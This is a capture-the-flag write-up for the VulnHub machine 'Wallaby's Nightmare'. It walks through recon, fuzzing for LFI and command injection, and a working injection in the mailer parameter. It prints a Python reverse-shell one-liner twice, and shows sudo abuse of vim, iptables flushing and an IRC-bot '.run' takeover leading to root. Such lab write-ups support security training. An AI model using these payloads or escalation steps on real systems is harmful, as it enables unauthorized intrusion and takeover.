---
title: Wallaby's Nightmare
categories: [Vulnhub, Linux]
date: 2022-03-12 
tags: [exploit/command-injection, linux-priv-esc/sudo/gtfo-bin ]
img_path: /Writeups/Vulnhub/Linux/Wallaby's Nightmare/images/
image:
  src: Pasted%20image%2020220312211231.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon
## NMAP Complete Scan
```
# Nmap 7.92 scan initiated Sat Mar 12 16:01:17 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Wallaby_Nightmare/192.168.110.39/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Wallaby_Nightmare/192.168.110.39/scans/xml/_full_tcp_nmap.xml 192.168.110.39
Nmap scan report for 192.168.110.39
Host is up, received arp-response (0.00050s latency).
Scanned at 2022-03-12 16:01:17 +08 for 19s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRXjkewNllkNLo46qiVKISIdysX+C//dfiL0yrAphV9jJg7ETXmLIcfKGQIuRVWXRPm5LgX1OE4LP4wmc5qWbCrI9HOZNMDDuZZsJ7hsHhDPVfu9J0aGoj69vPo7FCZlNWd+371cUiI0qmUeOGZGfAmZotGPkW9r6lom2ww6JphrtwpmlyI+pQk2x1qZR4ZnCIl+XmgFyGHEhim5ALMplxQP8qjnxjncr90xYSByjtQjlvURlemFjjbvVpPhX+BzsMAsXO16ywClLoig0dU39sSBbCSkgmryJYyLfkSWVO9KV6HPEXrVVxnHmUPwi19xGBiq9mxUbmPIza9r0BEofl
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE91a97Hjo/onlxZBy2uFVZ5oTYZcVW2ivqzxdbF0EANVVX5asJJWv3jnb0NQuZY0LqUEs3cObmDVrKETtWmDfw=
|   256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFgAepyDFEj6/qo0tkmqI6j2gL90Fft5eg4tKHe4YgH7
6667/tcp  filtered irc     no-response
60080/tcp open     http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Wallaby's Server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:80:57:12 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/12%OT=22%CT=1%CU=31449%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=622C5360%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 0.023 days (since Sat Mar 12 15:28:56 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.110.39

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 12 16:01:36 2022 -- 1 IP address (1 host up) scanned in 20.06 seconds

```
## TCP/60080 (HTTP)
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
└─# ffuf -u http://$ip:60080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi,.log' -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.39:60080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php .cgi .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 1147, Words: 220, Lines: 31]
index.php               [Status: 200, Size: 1147, Words: 220, Lines: 31]
javascript              [Status: 301, Size: 330, Words: 20, Lines: 10]
:: Progress: [27690/27690] :: Job [1/1] :: 7261 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
- `javascript`

### Nikto
```
┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
└─# nikto -ask=no -h http://192.168.110.39:60080 2>&1 | tee "/root/vulnHub/Wallaby_Nightmare/192.168.110.39/scans/tcp60080/tcp_60080_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.39
+ Target Hostname:    192.168.110.39
+ Target Port:        60080
+ Start Time:         2022-03-12 16:08:13 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-03-12 16:09:12 (GMT8) (59 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- LFI Vulnerability Found:
	- `/index.php?page=../../../../../../../../../../etc/passwd`



# Initial Foothold

## TCP/60080 (HTTP) - Enumerate URL parameter against LFI wordlist 
1. Check if LFI Vulnerability really exists
	![](Pasted%20image%2020220312162615.png)
	- A rabbit hole?
2. Enumerate URL parameter against a LFI wordlist
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# ffuf -u http://$ip:60080/index.php?page=../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fs 900

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.39:60080/index.php?page=../../../../..FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response size: 900
	________________________________________________
	Only /etc/passwd is enumerated
	```
3. Use `php://filter/convert.base64-encode/resource` to view the source code 
	![](Pasted%20image%2020220312163850.png)
4. Could not include SSH log files, Apache log files

## TCP/60080 (HTTP) - Enumerate URL parameter against a command injection wordlist
1. Enumerate URL parameter against a command injection wordlist
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# ffuf -u http://$ip:60080/index.php?page=FUZZ -w /usr/share/wordlists/command_injection/commandInjectionLinux.txt -fw 182,181,199

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.39:60080/index.php?page=FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/command_injection/commandInjectionLinux.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 182,181,199
	________________________________________________

	;system('id')           [Status: 200, Size: 1743, Words: 315, Lines: 39]
	system('cat /etc/passwd'); [Status: 200, Size: 1743, Words: 315, Lines: 39]
	:: Progress: [102/102] :: Job [1/1] :: 65 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

	# Word count 181 - Nice try ghz>hzx buddy, this vector is patched!
	# Word count 182 - Dude, ghz>hzx what are you trying over here?!
	# Word count 199 - /etc/passwd
	```
	- `;system('id')`, new output
2. View `;system('id')` output
		![](Pasted%20image%2020220312165348.png)
		-  `/?page=blacklist`
3. View `/?page=blacklist`
	![](Pasted%20image%2020220312170145.png)

## TCP/60080 (HTTP) - Enumerate URL parameter against a regular wordlist 
1. FUZZ URL parameter against `common.txt`
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# ffuf -u http://$ip:60080/index.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt  -fw 182,181

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.39:60080/index.php?page=FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 182,181
	________________________________________________

	home                    [Status: 200, Size: 1148, Words: 220, Lines: 31]
	index                   [Status: 200, Size: 1363, Words: 279, Lines: 39]
	mailer                  [Status: 200, Size: 1086, Words: 204, Lines: 30]
	:: Progress: [4615/4615] :: Job [1/1] :: 7324 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	```
2. View enumerated directories
	- `index`
		![](Pasted%20image%2020220312175004.png)
	- `home`
		![](Pasted%20image%2020220312175053.png)
	- `mail`
		![](Pasted%20image%2020220312175406.png)
		- Interesting comment found on the page source
		- `/?page=mailer&mail=mail`
		- There is a second URL parameter `mail`

## TCP/60080 (HTTP) - Enumerate 2nd URL Parameter + RCE
1. FUZZ `mail` parameter against command injection wordlist
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# ffuf -u "http://192.168.110.39:60080/?page=mailer&mail=FUZZ" -w /usr/share/wordlists/command_injection/commandInjectionLinux.txt  -fw 204

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.39:60080/?page=mailer&mail=FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/command_injection/commandInjectionLinux.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 204
	________________________________________________

	a|id                    [Status: 200, Size: 1134, Words: 206, Lines: 31]
	a|id                    [Status: 200, Size: 1134, Words: 206, Lines: 31]
	a;/usr/bin/id           [Status: 200, Size: 1134, Words: 206, Lines: 31]
	a;/usr/bin/id;          [Status: 200, Size: 1134, Words: 206, Lines: 31]
	a|/usr/bin/id           [Status: 200, Size: 1134, Words: 206, Lines: 31]
	%0Acat%20/etc/passwd    [Status: 200, Size: 2748, Words: 219, Lines: 62]
	a|/usr/bin/id           [Status: 200, Size: 1134, Words: 206, Lines: 31]
	%0Aid                   [Status: 200, Size: 1134, Words: 206, Lines: 31]
	%0Aid%0A                [Status: 200, Size: 1134, Words: 206, Lines: 31]
	%0A/usr/bin/id%0A       [Status: 200, Size: 1134, Words: 206, Lines: 31]
	%0A/usr/bin/id          [Status: 200, Size: 1134, Words: 206, Lines: 31]
	$;/usr/bin/id           [Status: 200, Size: 1134, Words: 206, Lines: 31]
	a;id                    [Status: 200, Size: 1134, Words: 206, Lines: 31]
	a;id;                   [Status: 200, Size: 1134, Words: 206, Lines: 31]
	%0Acat%20/etc/passwd    [Status: 200, Size: 2748, Words: 219, Lines: 62]
	:: Progress: [102/102] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
	```
	![](Pasted%20image%2020220312175826.png)
	- RCE achieved!
2. Start listener on kali
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	```
3. Execute python reverse shell payload
	``` 
	python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
	```
	![](Pasted%20image%2020220312180243.png)
4. www-data shell obtained
	![](Pasted%20image%2020220312180331.png)

# Privilege Escalation

## Waldo - Via SUDO
1. Check waldo's sudo access
	``` 
	www-data@ubuntu:/var/www/html$ sudo -l 
	Matching Defaults entries for www-data on ubuntu:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on ubuntu:
		(waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
		(ALL) NOPASSWD: /sbin/iptables
	www-data@ubuntu:/var/www/html$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
	```
	- `/usr/bin/vim /etc/apache2/sites-available/000-default.conf`
		- `vim` has a [GTFO Bins](https://gtfobins.github.io/gtfobins/vim/) entry
		- We are able to spawn a shell in `vim`
	-  `/sbin/iptables`
		- We are able to view and flush ip-table rules
2. View IP-Table rules
	``` 
	www-data@ubuntu:/var/www/html$ sudo /sbin/iptables -L
	Chain INPUT (policy ACCEPT)
	target     prot opt source               destination         
	ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
	DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd

	Chain FORWARD (policy ACCEPT)
	target     prot opt source               destination         

	Chain OUTPUT (policy ACCEPT)
	target     prot opt source               destination    
	```
	- ircd is blocked
3. Earlier, during our nmap scan we can see that `TCP/6667 - irc` is filtered
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# nmap $ip -p 6667
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 18:41 +08
	Nmap scan report for 192.168.110.39
	Host is up (0.00042s latency).

	PORT     STATE    SERVICE
	6667/tcp filtered irc
	MAC Address: 08:00:27:80:57:12 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
	```
4. Remove IP-Table rules
	``` 
	www-data@ubuntu:/var/www/html$ sudo /sbin/iptables --flush
	www-data@ubuntu:/var/www/html$ sudo /sbin/iptables -L
	Chain INPUT (policy ACCEPT)
	target     prot opt source               destination         

	Chain FORWARD (policy ACCEPT)
	target     prot opt source               destination         

	Chain OUTPUT (policy ACCEPT)
	target     prot opt source               destination         
	www-data@ubuntu:/var/www/html$ 
	```
5.  `TCP/6667 - irc` is no longer filtered
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# nmap $ip -p 6667
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 18:42 +08
	Nmap scan report for 192.168.110.39
	Host is up (0.00039s latency).

	PORT     STATE SERVICE
	6667/tcp open  irc
	MAC Address: 08:00:27:80:57:12 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
	```
6. Exploit `vim`, allowing us to privilege escalate to waldo
	``` 
	www-data@ubuntu:/var/www/html$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
	:!bash
	```
	![](Pasted%20image%2020220312182557.png)
	
## Wallaby - Via GTFO Bin + Misconfiguration of irc bot
1. Access `TCP/6667 - irc` on Kali w/ `irssi`
	``` 
	┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]
	└─# irssi

	# Connect to Target
	/CONNECT 192.168.110.39

	# List channels
	/LIST

	# Join channel
	/JOIN wallabyschat
	
	# List names, screenshot is based on this command
	/names
	```
	 ![](Pasted%20image%2020220312192026.png)
	- [More irssi commands ](https://www.linode.com/docs/guides/using-irssi-for-internet-relay-chat/)
2. View the details of the users connected to the channel
	``` 
	/WHOIS wallabysbot
	/WHOIS waldo
	```
	![](Pasted%20image%2020220312192654.png)
	- `wallabysbot` is based on [sopel](https://sopel.chat/#:~:text=Sopel%20is%20a%20simple%2C%20easy,you%20reminders%2C%20and%20much%20more.)
	- What is sopel
	>Sopel is **a simple, easy-to-use, open-source IRC utility bot, written in Python**. It's designed to be easy to use, easy to run, and easy to extend. Sopel comes with a ton of ready-made features for you to use. It can leave notes for people, give you reminders, and much more.
3. [Sopel commands](https://sopel.chat/usage/commands/), `.help` allows us to list all command's documentation
4. Instead of using `irssi` use `hexchat`(GUI) for easier usage
	1. Setup 
		![](Pasted%20image%2020220312195941.png)
	2. Search for channel (`/list`)
		![](Pasted%20image%2020220312203454.png)
	3. Join channel (`/join #wallabyschat`)
	4. List all wallabysbot commands (`.help`)
		![](Pasted%20image%2020220312203935.png)
	5. Execute `.run`
		![](Pasted%20image%2020220312204125.png)
		- We must be waldo in order to execute `.run`
	6. We are not able to change our nickname to `waldo` using an IRC command (`/nick waldo`),  since a user called waldo already exists
		![](Pasted%20image%2020220312204550.png)
		- waldo exists
5. There is a `irssi.sh` file that exists on waldo's home directory
	``` 
	waldo@ubuntu:~$ ls
	irssi.sh
	waldo@ubuntu:~$ cat irssi.sh 
	#!/bin/bash
	tmux new-session -d -s irssi
	tmux send-keys -t irssi 'n' Enter
	tmux send-keys -t irssi 'irssi' Enter
	waldo@ubuntu:~$ 
	```
	- There is a tmux session that is connected to the irc server
6. Kill the tmux session
	``` 
	waldo@ubuntu:~$ ps aux | grep tmux
	waldo      720  0.0  0.2  29416  2972 ?        Ss   07:24   0:00 tmux new-session -d -s irssi
	
	waldo@ubuntu:~$ pkill -9 tmux
	```
	![](Pasted%20image%2020220312204915.png)
7. Change nickname to waldo (`/nick waldo`)
	![](Pasted%20image%2020220312205010.png)
8. Execute `.run`
	![](Pasted%20image%2020220312205108.png)
	- Able to execute commands as wallaby
9. Obtain a wallaby shell
	``` 
	python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
	```
	![](Pasted%20image%2020220312205300.png)
10. wallaby shell obtained
	![](Pasted%20image%2020220312205327.png)
	
## Root - Via SUDO
1. Check wallaby's sudo access
	``` 
	$ sudo -l
	sudo -l
	Matching Defaults entries for wallaby on ubuntu:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User wallaby may run the following commands on ubuntu:
		(ALL) NOPASSWD: ALL
	```
2. Exploit 
	``` 
	$ sudo su
	sudo su
	root@ubuntu:/home/wallaby# whoami
	whoami
	root
	root@ubuntu:/home/wallaby# 
	```
3. Flag
	``` 
	root@ubuntu:~# cat flag.txt
	cat flag.txt
	###CONGRATULATIONS###

	You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

	This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

	Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

	Thanks guys!
	-Waldo
	root@ubuntu:~# 
	```
